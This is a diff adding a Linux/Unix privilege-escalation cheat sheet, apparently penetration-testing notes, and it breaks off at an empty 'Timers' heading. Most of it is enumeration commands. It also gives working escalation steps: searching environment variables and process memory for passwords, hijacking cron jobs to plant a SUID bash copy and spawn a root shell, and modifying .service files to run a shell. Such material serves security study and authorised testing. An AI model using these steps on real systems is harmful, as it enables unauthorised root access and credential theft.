@@ -1,2 +1,310 @@
 # Linux/Unix Privilege Escalation
 
+## Preparation & Finding Compilers and/or Tools
+
+Enumerate tools/languages that are installed:
+
+```text
+find / -name perl*
+find / -name python*
+find / -name gcc*
+find / -name cc
+find / -name go
+```
+
+Enumerate tools for file transfers:
+
+```text
+find / -name wget
+find / -name curl
+find / -name nc*
+find / -name netcat*
+find / -name tftp*
+find / -name ftp
+find / -name nfs
+find / -name base64
+```
+
+## System Information
+
+### Operating System 
+
+Enumerate the system distribution type and it's version:
+
+```text
+(cat /proc/version || uname -a ) 2>/dev/null
+lsb_release -a 2>/dev/null
+cat /etc/issue
+cat /etc/*-release
+# Debian Based
+cat /etc/lsb-release 
+# Redhat Based
+cat /etc/redhat-release
+```
+
+### Kernel Version
+
+Enumerate the kernel version and architecture:
+
+```text
+cat /proc/version
+uname -a
+uname -mrs
+# RPM
+rpm -q kernel
+dmesg | grep Linux
+ls /boot | grep vmlinuz
+```
+
+### Environment Variables
+
+Enumerate environment variables to find information \(like paths, passwords, API keys, programs, etc\):
+
+```text
+(env || set) 2>/dev/null
+cat /etc/profile
+cat /etc/bashrc
+cat ~/.bash_profile
+cat ~/.bashrc
+cat ~/.bash_logout
+env
+set
+```
+
+### Sudo Version
+
+There are vulnerable sudo versions, it is worth it enumerating these:
+
+```text
+sudo -v
+sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
+```
+
+## Applications & Services
+
+Enumerate the services that are running and their privilege:
+
+```text
+ps aux
+ps -ef
+top
+cat /etc/services
+```
+
+### Process running as root
+
+Enumerate services that are running as the root user and identify if one is vulnerable to something:
+
+```text
+ps aux | grep root
+ps -ef | grep root
+```
+
+### Process Program Versions
+
+Enumerate the version of the program that is running:
+
+```text
+absolute/path/of/program_name --version
+program_name --version
+program_name -v
+```
+
+### Package Version
+
+Enumerate the versions of the installed packages:
+
+```text
+dpkg -l #Debian
+rpm -qa #Redhat
+dpkg -l | grep program_name #Debian
+rpm -qa | grep program_name #Redhat
+```
+
+### Process Monitoring
+
+We can use [pspy ](https://github.com/DominicBreuker/pspy)to dynamically monitor the processes are running in the system. Pspy is designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. 
+
+### Process Memory
+
+Some services store credentials in plaintext in memory. Since the standard behaviour is that low privileged users cannot read data from other users, this technique is most likely to be used when you're a root user but when your current user own the process that contains the sensitive information then you can read it since your user own it.
+
+#### Credentials in Memory
+
+We can lookup for case insensitive strings in a process as follows:
+
+```text
+strings process_name | grep -i password
+```
+
+### Installed Applications
+
+Enumerate which applications are installed, their version, and if they are currently running in the system:
+
+```text
+ls -alh /usr/bin/
+ls -alh /sbin/
+dpkg -l
+rpm -qa
+ls -alh /var/cache/apt/archivesO
+ls -alh /var/cache/yum/
+```
+
+Enumerate useful binaries or tools:
+
+```text
+which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
+```
+
+### Services Configuration Files
+
+Enumerate misconfigured services and if they have vulnerable plugins:
+
+```text
+find / -iname '*.conf' 2>/dev/null
+find / -iname '*.ini' 2>/dev/null
+locate name_here.conf
+ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
+```
+
+Common configuration files are these:
+
+```text
+cat /etc/syslog.conf
+cat /etc/chttp.conf
+cat /etc/lighttpd.conf
+cat /etc/cups/cupsd.conf
+cat /etc/inetd.conf
+cat /etc/apache2/apache2.conf
+cat /etc/nginx/nginx.conf
+cat /etc/my.conf
+cat /etc/php/<version_number_here>/php.ini
+cat /etc/httpd/conf/httpd.conf
+cat /opt/lampp/etc/httpd.conf
+```
+
+### Writable .service files
+
+Enumerate if you have `.service` files that you could modify so it executes a shell when the service is started, restarted or stopped. Sometimes you may need to reboot the machine. 
+
+Enumerating `.service` files in the host:
+
+```text
+find / -iname '*.service' 2>/dev/null
+```
+
+You can create a shell with something like `ExecStart=/tmp/shell.sh` 
+
+### Writable service binaries
+
+If we have writable binaries then we can modify them to execute shells when the service is restarted.
+
+## Scheduled/Cron Jobs
+
+Enumerate the scheduled jobs:
+
+```text
+crontab -l
+crontab -u username -l
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+ls -al /etc/cron* /etc/at*
+cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+```
+
+Enumerate Cron Jobs with [pspy](https://github.com/DominicBreuker/pspy):
+
+```text
+./pspy64 -pf -i 1000
+```
+
+### Crontabs Configuration Files
+
+Review crontabs configuration files:
+
+```text
+cat /var/spool/cron
+cat /var/spool/cron/crontabs
+cat /etc/crontab
+```
+
+Some things to take into consideration are:
+
+* Is there a cronjob running as root?
+* Do you have write permissions to these files?
+  * If you do then try modifying the PATH environment variable or something alike.
+
+### Crontab PATH Environment Variable
+
+If a cron job program/script does **not use an absolute path**, and one of the PATH directories is **writable** by our user, we may be able to create a script with the same name as the cron job.
+
+One way we can take exploit this by doing a SUID bit on bash:
+
+```text
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+```
+
+Then we make it executable:
+
+```text
+chmod +x cron_job_name.sh
+```
+
+Now wait for the cron job to run, we can monitor it with:
+
+```text
+watch -n 1 ls -l /tmp/rootbash
+```
+
+As soon as the cron job runs the script and places SUID bit which is represented as an `s` , then we can spawn bash shell as root with the `-p` option:
+
+```text
+/tmp/rootbash -p
+```
+
+### Crontab Wildcards
+
+Enumerate wildcards `*` in a file/script:
+
+```text
+cat /path/to/cronjob_script.sh
+```
+
+If inside the script there's a line using a a wildcard `*` like the following:
+
+```text
+tar czf /tmp/filename.tar.gz *
+```
+
+With wildcards we can execute anything and since that's the case then we can search in [GTFOBins](https://gtfobins.github.io/) for program, in this scenario `tar` and see what we can do, for example executing a shell.
+
+### Cron Script Overwrite
+
+If you have **permissions to modify a cron script executed by root**, then you can elevate privileges easily:
+
+```bash
+echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /path/to/cron/script
+# Wait until it executes
+/tmp/rootbash -p
+```
+
+## Timers
+
+
+
+
+
+
+
